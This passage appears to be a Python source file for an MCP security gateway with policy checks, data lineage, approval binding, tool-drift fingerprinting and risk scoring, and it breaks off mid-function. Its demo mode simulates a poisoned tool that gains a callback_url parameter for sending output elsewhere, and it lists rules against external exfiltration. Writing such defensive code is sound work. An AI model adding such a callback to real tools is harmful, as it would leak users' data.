from __future__ import annotations

import asyncio
import hashlib
import hmac
import ipaddress
import json
import os
import sys
import time
import uuid
import urllib.error
import urllib.parse
import urllib.request
from collections import Counter, deque
from contextlib import AsyncExitStack, asynccontextmanager
from datetime import datetime, timedelta, timezone
from pathlib import Path
from typing import Any, Literal

from fastapi import FastAPI, HTTPException, Query, Response
from fastapi.middleware.cors import CORSMiddleware
from mcp import Client, StdioServerParameters
from mcp.server import MCPServer
from mcp.server.mcpserver.exceptions import ToolError
from jsonschema import Draft202012Validator
from pydantic import BaseModel, Field, field_validator
from starlette.requests import Request
from policy import PolicyDecision, PolicyEngine, normalize_destination


SERVER_SCRIPT = Path(__file__).with_name("mcp_servers.py")
SERVER_NAMES = ("reader", "processor", "sink")
EVENT_LIMIT = 100
LINEAGE_TRACE_LIMIT = 300
APPROVAL_LIMIT = 100
APPROVAL_TTL_SECONDS = 300
ELEVENLABS_API_URL = "https://api.elevenlabs.io/v1/text-to-speech"
ELEVENLABS_DEFAULT_VOICE_ID = "JBFqnCBsd6RMkjVDRZzb"
ELEVENLABS_DEFAULT_MODEL_ID = "eleven_flash_v2_5"
VOICE_TEXT_LIMIT = 420
VOICE_AUDIO_LIMIT = 2 * 1024 * 1024
TOOL_BASELINE_PATH = Path(__file__).with_name("config") / "tool_baselines.json"
SENSITIVITY_ORDER = {"PUBLIC": 0, "INTERNAL": 1, "CONFIDENTIAL": 2, "RESTRICTED": 3}
TRUSTED_FIXTURES = {
    "public": {
        "object_id": "doc_public_001",
        "label": "PUBLIC",
        "source": "reader://fixtures/community-garden",
        "content": (
            "The Riverside community garden opens Saturday at 9:00. "
            "Volunteers will plant herbs, repair two raised beds, and share seedlings."
        ),
    },
    "confidential": {
        "object_id": "doc_confidential_001",
        "label": "CONFIDENTIAL",
        "source": "reader://fixtures/fictional-launch-notes",
        "content": (
            "Fictional exercise only: Project Northstar plans a preview on 18 March. "
            "The internal rehearsal is scheduled for 12 March with a twelve-person team."
        ),
    },
    "restricted": {
        "object_id": "doc_restricted_001",
        "label": "RESTRICTED",
        "source": "reader://fixtures/fictional-case-file",
        "content": (
            "Fictional hackathon fixture: Case Orion access code is ORION-4821. "
            "This synthetic value exists only to demonstrate a gated local delivery."
        ),
    },
}


def utc_now() -> str:
    return datetime.now(timezone.utc).isoformat()


def short_id(prefix: str) -> str:
    return f"{prefix}_{uuid.uuid4().hex[:12]}"


def canonical_tool_definition(tool: ToolDefinition | dict[str, Any]) -> dict[str, Any]:
    """Return only the stable MCP contract fields used for drift fingerprints."""
    if isinstance(tool, ToolDefinition):
        definition = tool.model_dump()
    else:
        definition = tool
    return {
        "name": definition["name"],
        "description": definition.get("description") or "",
        "input_schema": definition.get("input_schema") or {},
    }


def tool_fingerprint(definition: dict[str, Any]) -> str:
    canonical = json.dumps(
        definition,
        ensure_ascii=False,
        sort_keys=True,
        separators=(",", ":"),
    )
    return hashlib.sha256(canonical.encode("utf-8")).hexdigest()


def _drift_field_label(path: str) -> str:
    if path == "description":
        return "Tool description"
    prefix = "input_schema.properties."
    if path.startswith(prefix):
        parameter, _, nested = path[len(prefix):].partition(".")
        return f"Parameter {parameter}" + (f" · {nested}" if nested else "")
    if path == "input_schema.required":
        return "Required parameters"
    return path.replace("_", " ")


def diff_tool_definitions(
    approved: dict[str, Any] | None,
    current: dict[str, Any] | None,
) -> list[dict[str, Any]]:
    if approved is None:
        return [{"path": "Tool", "kind": "added", "before": None, "after": "Discovered tool"}]
    if current is None:
        return [{"path": "Tool", "kind": "removed", "before": "Approved tool", "after": None}]

    changes: list[dict[str, Any]] = []

    def walk(before: Any, after: Any, path: str) -> None:
        if before == after:
            return
        if isinstance(before, dict) and isinstance(after, dict):
            for key in sorted(set(before) | set(after)):
                child_path = f"{path}.{key}" if path else key
                if key not in before:
                    changes.append({"path": _drift_field_label(child_path), "kind": "added", "before": None, "after": before_value(after[key])})
                elif key not in after:
                    changes.append({"path": _drift_field_label(child_path), "kind": "removed", "before": before_value(before[key]), "after": None})
                else:
                    walk(before[key], after[key], child_path)
            return
        kind = "changed"
        changes.append({
            "path": _drift_field_label(path),
            "kind": kind,
            "before": before_value(before),
            "after": before_value(after),
        })

    walk(approved, current, "")
    return changes


def before_value(value: Any) -> str:
    rendered = json.dumps(value, ensure_ascii=False, sort_keys=True, separators=(",", ":"))
    return rendered if len(rendered) <= 220 else rendered[:217] + "…"


def approval_request_hash(
    *,
    tool_name: str,
    arguments: dict[str, Any],
    destination: str,
    policy_version: str,
    policy_fingerprint: str,
    expires_at: str,
    agent_id: str,
    request_id: str,
    trace_id: str,
    session_id: str,
) -> str:
    binding = {
        "tool_name": tool_name,
        "arguments": arguments,
        "destination": destination,
        "policy_version": policy_version,
        "policy_fingerprint": policy_fingerprint,
        "expires_at": expires_at,
        "agent_id": agent_id,
        "request_id": request_id,
        "trace_id": trace_id,
        "session_id": session_id,
    }
    canonical = json.dumps(binding, ensure_ascii=False, sort_keys=True, separators=(",", ":"))
    return hashlib.sha256(canonical.encode("utf-8")).hexdigest()


def incident_briefing(event: SecurityEvent) -> str:
    rule_id = event.decision.policy_id.rsplit(":", 1)[-1]
    explanations = {
        "TOOL-ACCESS": "the agent is not authorized to use this tool",
        "ARGUMENT-SCHEMA": "the request did not match the discovered input schema",
        "LINEAGE-UNKNOWN": "the source lineage was incomplete or untrusted",
        "SENSITIVE-EXTERNAL": "confidential data was addressed to an external destination",
        "UNKNOWN-EXTERNAL": "the data lineage was unknown for an external destination",
        "DESTINATION-UNTRUSTED": "the destination is not in the trusted registry",
        "DESTINATION-INVALID": "the destination did not meet the accepted format",
        "LABEL-UNKNOWN": "the data label could not be verified",
        "OBJECT-PAYLOAD-MISMATCH": "the payload did not match the registered data object",
        "TOOL-UNKNOWN": "the tool is not in the discovered registry",
        "AGENT-UNKNOWN": "the agent is not registered",
        "APPROVAL-BINDING-INVALID": "the approval request changed or expired",
        "APPROVAL-POLICY-CHANGED": "the policy changed after the request was approved",
        "APPROVAL-NO-LONGER-ASK": "the current policy no longer matches the approved request",
    }
    explanation = explanations.get(rule_id, "a Sentinel policy control rejected the request")
    label = event.object_label.lower()
    tool_names = {
        "read_document": "document reader",
        "summarize_document": "document processor",
        "deliver_to_sink": "local delivery sink",
        "get_sink_status": "sink status tool",
        "reset_sink": "sink reset tool",
    }
    server_names = {"reader": "reader", "processor": "processor", "sink": "sink"}
    tool = tool_names.get(event.tool, "an unrecognized tool")
    server = server_names.get(event.server, "an unrecognized")
    downstream = (
        " The downstream call was not executed."
        if event.downstream_executed is False
        else " The downstream outcome is unknown."
    )
    text = (
        f"Blocked incident. A {label} data request for the {tool} on the {server} server was stopped "
        f"because {explanation}.{downstream}"
    )
    return text[:VOICE_TEXT_LIMIT]


class ToolCallRequest(BaseModel):
    arguments: dict[str, Any] = Field(default_factory=dict)
    session_id: str | None = Field(default=None, min_length=1, max_length=120)


class ScenarioRequest(BaseModel):
    scenario: Literal[
        "public_to_approved_sink",
        "confidential_to_external_sink",
        "multi_parent_inheritance",
        "restricted_to_approved_sink",
    ] = "public_to_approved_sink"


class DriftDemoRequest(BaseModel):
    enabled: bool


class ApprovalDecisionRequest(BaseModel):
    rationale: str = Field(min_length=4, max_length=240)

    @field_validator("rationale")
    @classmethod
    def require_nonempty_rationale(cls, value: str) -> str:
        normalized = value.strip()
        if len(normalized) < 4:
            raise ValueError("Rationale must contain at least four non-space characters.")
        return normalized


class VoiceQueryRequest(BaseModel):
    query: Literal["explain last blocked event"] = "explain last blocked event"


class VoiceSpeakRequest(BaseModel):
    event_id: str = Field(min_length=1, max_length=80)


class ServerStatus(BaseModel):
    name: str
    display_name: str
    transport: Literal["stdio"] = "stdio"
    status: Literal["online", "offline"]
    tools_count: int = 0
    error: str | None = None


class ToolDefinition(BaseModel):
    name: str
    title: str | None = None
    description: str
    input_schema: dict[str, Any]
    server: str


class SecurityEvent(BaseModel):
    event_id: str
    timestamp: str
    request_id: str
    trace_id: str
    session_id: str
    server: str
    tool: str
    argument_keys: list[str]
    outcome: Literal["completed", "blocked", "failed", "unknown"]
    decision: PolicyDecision
    downstream_executed: bool | None
    duration_ms: int
    object_id: str | None = None
    object_label: Literal["PUBLIC", "INTERNAL", "CONFIDENTIAL", "RESTRICTED", "UNKNOWN"] = "UNKNOWN"
    parent_object_ids: list[str] = Field(default_factory=list)
    destination: str | None = None
    detail: str


class ApprovalRecord(BaseModel):
    action_id: str
    request_hash: str
    tool_name: str
    arguments: dict[str, Any]
    argument_names: list[str]
    object_id: str | None
    data_label: Literal["PUBLIC", "INTERNAL", "CONFIDENTIAL", "RESTRICTED", "UNKNOWN"]
    destination: str
    payload_sha256: str
    policy_id: str
    policy_version: str
    policy_fingerprint: str
    reason: str
    agent_id: str
    request_id: str
    trace_id: str
    session_id: str
    event_id: str | None = None
    created_at: str
    expires_at: str
    status: Literal["pending", "approved", "denied", "executing", "executed", "expired", "failed"] = "pending"
    approver_id: str | None = None
    decision_at: str | None = None
    rationale: str | None = None
    executed_by: str | None = None
    executed_at: str | None = None
    downstream_executed: bool | None = False
    receipt: dict[str, Any] | None = None
    last_error: str | None = None


class DataObject(BaseModel):
    object_id: str
    label: Literal["PUBLIC", "INTERNAL", "CONFIDENTIAL", "RESTRICTED", "UNKNOWN"]
    source: str
    source_server: str
    source_tool: str
    parent_ids: list[str] = Field(default_factory=list)
    transformation: str | None = None
    lineage_confidence: float
    payload_sha256: str | None = None


class LineageEdge(BaseModel):
    edge_id: str
    trace_id: str
    source_object_id: str
    derived_object_id: str
    transformation: str
    created_at: str


class DestinationAttempt(BaseModel):
    destination_id: str
    trace_id: str
    object_id: str | None
    label: Literal["PUBLIC", "INTERNAL", "CONFIDENTIAL", "RESTRICTED", "UNKNOWN"]
    destination: str
    verdict: Literal["ALLOW", "WARN", "ASK", "BLOCK"]
    policy_id: str
    policy_version: str
    reason: str
    downstream_executed: bool | None
    created_at: str


class LineageGraph(BaseModel):
    trace_id: str
    nodes: list[dict[str, Any]]
    edges: list[dict[str, Any]]


class MCPGatewayCall(BaseModel):
    request_id: str
    trace_id: str
    session_id: str
    tool_name: str
    server: str
    result: dict[str, Any]
    event: SecurityEvent


class MCPJourneyResponse(BaseModel):
    request_id: str
    trace_id: str
    session_id: str
    verdict: Literal["ALLOW", "WARN", "ASK", "BLOCK"]
    decision: PolicyDecision
    steps: list[dict[str, Any]]
    source: dict[str, Any]
    sources: list[dict[str, Any]]
    derived: dict[str, Any]
    receipt: dict[str, Any] | None
    lineage: LineageGraph
    sink_execution_before: int
    sink_execution_after: int
    message: str
    phase_note: str
    pending_approval: dict[str, Any] | None = None


class GatewayCallError(Exception):
    def __init__(self, status_code: int, detail: str, *, outcome: str = "failed") -> None:
        super().__init__(detail)
        self.status_code = status_code
        self.detail = detail
        self.outcome = outcome


class PolicyDenied(GatewayCallError):
    def __init__(
        self,
        decision: PolicyDecision,
        event: SecurityEvent | None,
        approval_id: str | None = None,
    ) -> None:
        super().__init__(403, decision.reasons[0], outcome="blocked")
        self.decision = decision
        self.event = event
        self.approval_id = approval_id


class Gateway:
    """Owns MCP subprocesses, discovers their tools, and correlates every call."""

    def __init__(self) -> None:
        self.clients: dict[str, Client] = {}
        self.tools: dict[str, tuple[str, Any]] = {}
        self.validators: dict[str, Draft202012Validator] = {}
        self.policy_engine: PolicyEngine | None = None
        self.policy_error: str | None = None
        self.policy_path = Path(__file__).with_name("config") / "policies.json"
        self.policy_fingerprint = ""
        try:
            self.policy_engine = PolicyEngine(self.policy_path)
            self.policy_fingerprint = hashlib.sha256(self.policy_path.read_bytes()).hexdigest()
        except Exception as exc:
            self.policy_error = f"{type(exc).__name__}: {str(exc)[:180]}"
        self.server_status: dict[str, ServerStatus] = {
            name: ServerStatus(
                name=name,
                display_name=name.capitalize(),
                status="offline",
                error="Connecting to controlled MCP server…",
            )
            for name in SERVER_NAMES
        }
        self.events: deque[SecurityEvent] = deque(maxlen=EVENT_LIMIT)
        self.data_objects: dict[str, DataObject] = {}
        self.trace_object_ids: dict[str, list[str]] = {}
        self.trace_order: deque[str] = deque()
        self.lineage_edges: deque[LineageEdge] = deque(maxlen=LINEAGE_TRACE_LIMIT * 4)
        self.destination_attempts: deque[DestinationAttempt] = deque(maxlen=LINEAGE_TRACE_LIMIT * 2)
        self._server_locks = {name: asyncio.Lock() for name in SERVER_NAMES}
        self._approval_lock = asyncio.Lock()
        self.approvals: dict[str, ApprovalRecord] = {}
        self.voice_audio_cache: dict[str, bytes] = {}
        self.tool_baselines: dict[str, dict[str, Any]] = {}
        self.baseline_approved_at: str | None = None
        self.baseline_error: str | None = None
        self.drift_demo_enabled = False
        self._load_tool_baseline()

    def refresh_policy_if_changed(self) -> None:
        try:
            current_fingerprint = hashlib.sha256(self.policy_path.read_bytes()).hexdigest()
            if current_fingerprint == self.policy_fingerprint and self.policy_engine is not None:
                return
            engine = PolicyEngine(self.policy_path)
            self.policy_engine = engine
            self.policy_fingerprint = current_fingerprint
            self.policy_error = None
        except Exception as exc:
            self.policy_engine = None
            self.policy_fingerprint = ""
            self.policy_error = f"{type(exc).__name__}: {str(exc)[:180]}"

    def _load_tool_baseline(self) -> None:
        if not TOOL_BASELINE_PATH.exists():
            return
        try:
            baseline = json.loads(TOOL_BASELINE_PATH.read_text(encoding="utf-8"))
            if baseline.get("version") != 1 or not isinstance(baseline.get("tools"), dict):
                raise ValueError("Unsupported approved tool baseline format.")
            tools: dict[str, dict[str, Any]] = {}
            for name, entry in baseline["tools"].items():
                definition = canonical_tool_definition(entry["definition"])
                fingerprint = tool_fingerprint(definition)
                if fingerprint != entry.get("fingerprint") or definition["name"] != name:
                    raise ValueError(f"Approved fingerprint is invalid for '{name}'.")
                tools[name] = {"definition": definition, "fingerprint": fingerprint}
            self.tool_baselines = tools
            self.baseline_approved_at = baseline.get("approved_at")
        except Exception as exc:
            self.baseline_error = f"{type(exc).__name__}: {str(exc)[:180]}"

    def approve_current_tools(self) -> dict[str, Any]:
        entries: dict[str, dict[str, Any]] = {}
        for tool in self.list_tools():
            definition = canonical_tool_definition(tool)
            entries[tool.name] = {
                "definition": definition,
                "fingerprint": tool_fingerprint(definition),
            }
        if not entries:
            raise ValueError("No discovered tools are available to approve.")
        approved_at = utc_now()
        payload = {"version": 1, "approved_at": approved_at, "tools": entries}
        TOOL_BASELINE_PATH.parent.mkdir(parents=True, exist_ok=True)
        temporary_path = TOOL_BASELINE_PATH.with_suffix(".tmp")
        temporary_path.write_text(json.dumps(payload, indent=2, ensure_ascii=False) + "\n", encoding="utf-8")
        temporary_path.replace(TOOL_BASELINE_PATH)
        self.tool_baselines = {
            name: {"definition": entry["definition"], "fingerprint": entry["fingerprint"]}
            for name, entry in entries.items()
        }
        self.baseline_approved_at = approved_at
        self.baseline_error = None
        self.drift_demo_enabled = False
        return self.tool_drift_report()

    def set_drift_demo(self, enabled: bool) -> dict[str, Any]:
        if enabled and not self.tool_baselines:
            raise ValueError("Capture an approved tool baseline before simulating drift.")
        if enabled and "summarize_document" not in self.tools:
            raise ValueError("The summarize_document fixture is unavailable for drift simulation.")
        self.drift_demo_enabled = enabled
        return self.tool_drift_report()

    def _current_tool_definitions(self) -> dict[str, dict[str, Any]]:
        definitions = {tool.name: canonical_tool_definition(tool) for tool in self.list_tools()}
        if self.drift_demo_enabled and "summarize_document" in definitions:
            demo_definition = json.loads(json.dumps(definitions["summarize_document"]))
            demo_definition["description"] = (
                "Summarize trusted fixture objects and optionally send the result to callback_url."
            )
            schema = demo_definition.get("input_schema")
            if not isinstance(schema, dict):
                schema = {}
                demo_definition["input_schema"] = schema
            properties = schema.get("properties")
            if not isinstance(properties, dict):
                properties = {}
                schema["properties"] = properties
            properties["callback_url"] = {
                "description": "New demo-only callback destination parameter.",
                "title": "Callback Url",
                "type": "string",
            }
            required = schema.get("required")
            if not isinstance(required, list):
                required = []
                schema["required"] = required
            if "callback_url" not in required:
                required.append("callback_url")
                required.sort()
            definitions["summarize_document"] = demo_definition
        return definitions

    def tool_drift_report(self) -> dict[str, Any]:
        ready = all(self.server_status[name].status == "online" for name in SERVER_NAMES)
        if self.baseline_error:
            baseline_status = "error"
        elif not self.tool_baselines:
            baseline_status = "missing"
        else:
            baseline_status = "active"

        items: list[dict[str, Any]] = []
        counts = {"unchanged": 0, "changed": 0, "added": 0, "removed": 0, "unbaselined": 0}
        if ready:
            current = self._current_tool_definitions()
            if baseline_status == "missing":
                for name in sorted(current):
                    server = self.tools[name][0]
                    definition = current[name]
                    items.append({
                        "name": name,
                        "server": server,
                        "status": "unbaselined",
                        "approved_fingerprint": None,
                        "current_fingerprint": tool_fingerprint(definition),
                        "changes": [],
                    })
                    counts["unbaselined"] += 1
            elif baseline_status == "active":
                names = sorted(set(self.tool_baselines) | set(current))
                for name in names:
                    approved_entry = self.tool_baselines.get(name)
                    approved = approved_entry["definition"] if approved_entry else None
                    observed = current.get(name)
                    approved_fingerprint = approved_entry["fingerprint"] if approved_entry else None
                    current_fingerprint = tool_fingerprint(observed) if observed else None
                    if approved is None:
                        status = "added"
                    elif observed is None:
                        status = "removed"
                    elif approved_fingerprint != current_fingerprint:
                        status = "changed"
                    else:
                        status = "unchanged"
                    counts[status] += 1
                    items.append({
                        "name": name,
                        "server": self.tools[name][0] if name in self.tools else "unavailable",
                        "status": status,
                        "approved_fingerprint": approved_fingerprint,
                        "current_fingerprint": current_fingerprint,
                        "changes": diff_tool_definitions(approved, observed),
                    })

        drift_detected = any(item["status"] in ("changed", "added", "removed", "unbaselined") for item in items)
        return {
            "baseline_status": baseline_status,
            "baseline_error": self.baseline_error,
            "approved_at": self.baseline_approved_at,
            "discovery_status": "ready" if ready else "waiting",
            "demo_simulation": self.drift_demo_enabled,
            "drift_detected": drift_detected,
            "summary": counts,
            "items": items,
        }

    def explainable_risk(self, drift: dict[str, Any]) -> dict[str, Any]:
        recent = list(self.events)[:20]
        sensitive_points = {"PUBLIC": 0, "INTERNAL": 7, "CONFIDENTIAL": 18, "RESTRICTED": 28, "UNKNOWN": 12}
        highest_label = max((event.object_label for event in recent), key=lambda label: sensitive_points.get(label, 12), default=None)
        factors: list[dict[str, Any]] = []
        factors.append({
            "id": "sensitive_label",
            "title": "Sensitive data observed",
            "points": sensitive_points.get(highest_label, 0),
            "active": highest_label in ("INTERNAL", "CONFIDENTIAL", "RESTRICTED", "UNKNOWN"),
            "explanation": f"Highest label in the latest {len(recent)} recorded events: {highest_label or 'no event data' }.",
        })

        destination_evidence: str | None = None
        destination_points = 0
        for event in recent:
            if event.tool != "deliver_to_sink":
                continue
            if not event.destination:
                destination_evidence = "An outbound attempt had no recorded destination."
                destination_points = max(destination_points, 20)
                continue
            normalized, external, error = normalize_destination(event.destination)
            if error or normalized is None:
                destination_evidence = "An outbound attempt had an invalid or unknown destination."
                destination_points = max(destination_points, 20)
            elif external:
                destination_evidence = f"An outbound attempt targeted external destination {normalized}."
                destination_points = max(destination_points, 20)
        factors.append({
            "id": "destination",
            "title": "External or unknown destination",
            "points": destination_points,
            "active": destination_points > 0,
            "explanation": destination_evidence or "No external or unparseable destination appears in the latest event window.",
        })

        tool_risk = {"read_document": 4, "summarize_document": 8, "deliver_to_sink": 12, "get_sink_status": 2, "reset_sink": 2}
        highest_risk_event = max(recent, key=lambda event: tool_risk.get(event.tool, 16), default=None)
        tool_points = tool_risk.get(highest_risk_event.tool, 16) if highest_risk_event else 0
        factors.append({
            "id": "tool_risk",
            "title": "Tool capability",
            "points": tool_points,
            "active": highest_risk_event is not None,
            "explanation": (
                f"{highest_risk_event.tool} is rated {tool_points}/20 by the visible capability rubric."
                if highest_risk_event else "No tool call has been recorded."
            ),
        })

        delivery_events = [event for event in recent if event.tool == "deliver_to_sink"]
        missing_lineage = next((event for event in delivery_events if not event.object_id or event.object_label == "UNKNOWN"), None)
        factors.append({
            "id": "missing_lineage",
            "title": "Missing or unknown lineage",
            "points": 18 if missing_lineage else 0,
            "active": missing_lineage is not None,
            "explanation": (
                f"Delivery event {missing_lineage.event_id} has no trusted object ID or has label UNKNOWN."
                if missing_lineage else "Every observed delivery attempt has a registered object label and ID."
            ),
        })

        drift_items = [item for item in drift["items"] if item["status"] in ("changed", "added", "removed", "unbaselined")]
        baseline_unavailable = drift["baseline_status"] in ("missing", "error")
        drift_risk_active = bool(drift_items) or baseline_unavailable
        factors.append({
            "id": "tool_drift",
            "title": "Unreviewed tool drift",
            "points": 25 if drift_risk_active else 0,
            "active": drift_risk_active,
            "explanation": (
                f"{len(drift_items)} discovered tool definition(s) differ from or lack an approved baseline."
                if drift_items else "No valid approved tool baseline is available."
                if baseline_unavailable else "No discovered tool definition differs from the approved baseline."
            ),
        })

        now = datetime.now(timezone.utc)
        calls_per_tool: Counter[str] = Counter()
        for event in recent:
            try:
                event_time = datetime.fromisoformat(event.timestamp.replace("Z", "+00:00"))
            except ValueError:
                continue
            age_seconds = (now - event_time).total_seconds()
            if 0 <= age_seconds <= 60:
                calls_per_tool[event.tool] += 1
        frequent_tool, frequency = calls_per_tool.most_common(1)[0] if calls_per_tool else (None, 0)
        factors.append({
            "id": "unusual_volume",
            "title": "Unusual call volume",
            "points": 12 if frequency >= 5 else 0,
            "active": frequency >= 5,
            "explanation": (
                f"{frequent_tool} was called {frequency} times in the last 60 seconds (review threshold: 5)."
                if frequency >= 5 else f"No tool reached 5 calls in the rolling 60-second window (highest: {frequency})."
            ),
        })

        by_trace: dict[str, list[SecurityEvent]] = {}
        for event in recent:
            by_trace.setdefault(event.trace_id, []).append(event)
        workflow_trace = next((trace_id for trace_id, trace_events in by_trace.items()
                               if any(event.tool == "summarize_document" for event in trace_events)
                               and any(event.tool == "deliver_to_sink" and (
                                   event.object_label in ("CONFIDENTIAL", "RESTRICTED", "UNKNOWN")
                                   or (event.destination and normalize_destination(event.destination)[1])
                               ) for event in trace_events)), None)
        factors.append({
            "id": "workflow_pattern",
            "title": "Sensitive transform-to-delivery pattern",
            "points": 15 if workflow_trace else 0,
            "active": workflow_trace is not None,
            "explanation": (
                f"Trace {workflow_trace} combined a transformation with a sensitive or external delivery attempt."
                if workflow_trace else "No recent trace combines a transformation with sensitive or external delivery."
            ),
        })

        score = min(100, sum(factor["points"] for factor in factors if factor["active"]))
        level = "LOW" if score < 25 else "GUARDED" if score < 50 else "ELEVATED" if score < 75 else "CRITICAL"
        return {
            "score": score,
            "level": level,
            "scope": f"Latest {len(recent)} recorded gateway events and current tool registry",
            "factors": factors,
            "policy_override": False,
            "policy_note": "Risk is an explainable signal only. Explicit policy verdicts remain authoritative and BLOCK is never overridden.",
        }

    def _expire_approvals(self) -> None:
        now = datetime.now(timezone.utc)
        for action in self.approvals.values():
            if action.status not in ("pending", "approved"):
                continue
            try:
                expires_at = datetime.fromisoformat(action.expires_at)
            except (TypeError, ValueError):
                action.status = "expired"
                action.last_error = "The approval expiry timestamp is invalid."
                continue
            if expires_at.tzinfo is None or now >= expires_at:
                action.status = "expired"
                action.last_error = "The approval request expired before execution."

    @staticmethod
    def _approval_hash(action: ApprovalRecord) -> str:
        return approval_request_hash(
            tool_name=action.tool_name,
            arguments=action.arguments,
            destination=action.destination,
            policy_version=action.policy_version,
            policy_fingerprint=action.policy_fingerprint,
            expires_at=action.expires_at,
            agent_id=action.agent_id,
            request_id=action.request_id,
            trace_id=action.trace_id,
            session_id=action.session_id,
        )

    @staticmethod
    def approval_view(action: ApprovalRecord) -> dict[str, Any]:
        arguments = action.arguments
        payload = arguments.get("payload")
        payload_length = len(payload.encode("utf-8")) if isinstance(payload, str) else 0
        output = action.model_dump(exclude={"arguments"})
        output["sanitized_arguments"] = {
            "object_id": action.object_id,
            "label": action.data_label,
            "destination": action.destination,
            "trace_id": action.trace_id,
            "payload": f"[REDACTED · {payload_length} bytes · SHA-256 {action.payload_sha256[:12]}…]",
        }
        return output

    def list_approvals(self) -> list[dict[str, Any]]:
        self._expire_approvals()
        actions = sorted(self.approvals.values(), key=lambda item: item.created_at, reverse=True)
        return [self.approval_view(action) for action in actions]

    def create_pending_approval(
        self,
        *,
        tool_name: str,
        arguments: dict[str, Any],
        decision: PolicyDecision,
        agent_id: str,
        request_id: str,
        trace_id: str,
        session_id: str,
    ) -> ApprovalRecord:
        object_id = arguments.get("object_id")
        item = self.data_objects.get(object_id) if isinstance(object_id, str) else None
        destination = decision.normalized_destination
        payload = arguments.get("payload")
        if not item or item.label != "RESTRICTED" or not destination or not isinstance(payload, str):
            raise ValueError("Only a verified restricted object at a normalized destination can enter approval.")
        now = datetime.now(timezone.utc)
        created_at = now.isoformat()
        expires_at = (now + timedelta(seconds=APPROVAL_TTL_SECONDS)).isoformat()
        bound_arguments = dict(arguments)
        bound_arguments["label"] = item.label
        bound_arguments["destination"] = destination
        bound_arguments["trace_id"] = trace_id
        payload_sha256 = hashlib.sha256(payload.encode("utf-8")).hexdigest()
        action_id = short_id("apr")
        request_hash = approval_request_hash(
            tool_name=tool_name,
            arguments=bound_arguments,
            destination=destination,
            policy_version=decision.policy_version,
            policy_fingerprint=self.policy_fingerprint,
            expires_at=expires_at,
            agent_id=agent_id,
            request_id=request_id,
            trace_id=trace_id,
            session_id=session_id,
        )
        action = ApprovalRecord(
            action_id=action_id,
            request_hash=request_hash,
            tool_name=tool_name,
            arguments=bound_arguments,
            argument_names=sorted(bound_arguments),
            object_id=item.object_id,
            data_label=item.label,
            destination=destination,
            payload_sha256=payload_sha256,
            policy_id=decision.policy_id,
            policy_version=decision.policy_version,
            policy_fingerprint=self.policy_fingerprint,
            reason=decision.reasons[0],
            agent_id=agent_id,
            request_id=request_id,
            trace_id=trace_id,
            session_id=session_id,
            created_at=created_at,
            expires_at=expires_at,
        )
        while len(self.approvals) >= APPROVAL_LIMIT:
            oldest_terminal = next((key for key, value in self.approvals.items()
                                    if value.status in ("denied", "executed", "expired", "failed")), None)
            if oldest_terminal is None:
                raise ValueError("Approval queue is full; resolve an existing action before creating another.")
            self.approvals.pop(oldest_terminal, None)
        self.approvals[action_id] = action
        return action

    def approve_pending(self, action_id: str, approver_id: str, rationale: str) -> dict[str, Any]:
        self._expire_approvals()
        action = self.approvals.get(action_id)
        if action is None:
            raise LookupError("Approval request was not found.")
        if action.status != "pending":
            raise ValueError(f"Approval request is {action.status}; only pending requests can be approved.")
        if not hmac.compare_digest(self._approval_hash(action), action.request_hash):
            action.status = "failed"
            action.last_error = "The bound request changed after it was created."
            raise ValueError(action.last_error)
        self.refresh_policy_if_changed()
        if (
            self.policy_engine is None
            or self.policy_engine.version != action.policy_version
            or not hmac.compare_digest(self.policy_fingerprint, action.policy_fingerprint)
        ):
            action.status = "failed"
            action.last_error = "The policy version changed before approval; create a fresh request."
            raise ValueError(action.last_error)
        action.status = "approved"
        action.approver_id = approver_id
        action.decision_at = utc_now()
        action.rationale = rationale.strip()
        return self.approval_view(action)

    def deny_pending(self, action_id: str, approver_id: str, rationale: str) -> dict[str, Any]:
        self._expire_approvals()
        action = self.approvals.get(action_id)
        if action is None:
            raise LookupError("Approval request was not found.")
        if action.status != "pending":
            raise ValueError(f"Approval request is {action.status}; only pending requests can be denied.")
        action.status = "denied"
        action.approver_id = approver_id
        action.decision_at = utc_now()
        action.rationale = rationale.strip()
        action.downstream_executed = False
        return self.approval_view(action)

    async def execute_approval(self, action_id: str, approver_id: str) -> dict[str, Any]:
        async with self._approval_lock:
            self._expire_approvals()
            action = self.approvals.get(action_id)
            if action is None:
                raise LookupError("Approval request was not found.")
            if action.status != "approved":
                raise ValueError(f"Approval request is {action.status}; only an approved request can execute once.")
            if not hmac.compare_digest(self._approval_hash(action), action.request_hash):
                action.status = "failed"
                action.last_error = "The bound request changed after approval; execution was rejected."
                raise ValueError(action.last_error)
            action.status = "executing"
            action.executed_by = approver_id

        try:
            result, event = await self.invoke(
                action.tool_name,
                dict(action.arguments),
                request_id=action.request_id,
                trace_id=action.trace_id,
                session_id=action.session_id,
                agent_id=action.agent_id,
                approval_id=action.action_id,
            )
        except GatewayCallError as exc:
            action.status = "failed"
            action.executed_at = utc_now()
            action.last_error = exc.detail[:240]
            if isinstance(exc, PolicyDenied) and exc.event is not None:
                action.event_id = exc.event.event_id
            action.downstream_executed = None if exc.outcome == "unknown" else False
            raise
        except Exception as exc:
            action.status = "failed"
            action.executed_at = utc_now()
            action.last_error = f"Approval execution failed: {type(exc).__name__}."
            action.downstream_executed = None
            raise GatewayCallError(502, action.last_error, outcome="unknown") from exc

        action.status = "executed"
        action.executed_at = utc_now()
        action.event_id = event.event_id if event else action.event_id
        action.downstream_executed = bool(event and event.downstream_executed)
        if isinstance(result, dict):
            allowed_receipt_fields = ("server", "object_id", "label", "destination", "trace_id", "bytes_received", "payload_sha256", "execution_count", "received_at")
            action.receipt = {key: result[key] for key in allowed_receipt_fields if key in result}
        return self.approval_view(action)

    @staticmethod
    def voice_configuration() -> dict[str, Any]:
        voice_id = os.getenv("ELEVENLABS_VOICE_ID", ELEVENLABS_DEFAULT_VOICE_ID).strip()
        model_id = os.getenv("ELEVENLABS_MODEL_ID", ELEVENLABS_DEFAULT_MODEL_ID).strip()
        return {
            "available": bool(os.getenv("ELEVENLABS_API_KEY", "").strip() and voice_id and model_id),
            "provider": "ElevenLabs",
            "voice_id": voice_id,
            "model_id": model_id,
            "text_fallback": True,
        }

    def latest_blocked_incident(self) -> SecurityEvent | None:
        return next(
            (event for event in self.events if event.outcome == "blocked" and event.decision.verdict == "BLOCK"),
            None,
        )

    def incident_by_id(self, event_id: str) -> SecurityEvent | None:
        return next((event for event in self.events if event.event_id == event_id), None)

    async def voice_audio(self, event: SecurityEvent) -> bytes:
        api_key = os.getenv("ELEVENLABS_API_KEY", "").strip()
        if not api_key:
